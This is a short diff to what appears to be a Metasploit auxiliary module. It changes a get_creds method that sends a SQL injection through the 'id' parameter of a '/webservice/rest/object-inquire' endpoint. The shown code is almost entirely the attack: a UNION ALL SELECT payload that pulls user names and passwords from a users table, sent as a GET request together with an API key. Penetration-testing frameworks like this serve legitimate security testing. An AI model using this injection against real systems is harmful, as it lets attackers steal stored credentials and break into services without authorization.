@@ -42,14 +42,17 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def get_creds
-    api_uri = "/webservice/rest/object-inquire?apikey=#{datastore['APIKEY']}&id="
+    api_uri = "/webservice/rest/object-inquire"
     api_uri = normalize_uri(target_uri.path, api_uri)
-    cmd = '1) UNION ALL SELECT CONCAT(name," ",password) from users#'
-    cmd = Rex::Text.uri_encode(cmd, 'hex-all')
+    cmd = "#{rand(256)}) UNION ALL SELECT CONCAT(name,\" \",password) from users#"
 
     res = send_request_cgi(
       'method'  =>  'GET',
-      'uri'     =>  api_uri << cmd
+      'uri'     =>  api_uri,
+      'vars_get'  =>  {
+        'apikey'  => datastore['APIKEY'],
+        'id'      => cmd
+      }
     )
 
     unless res
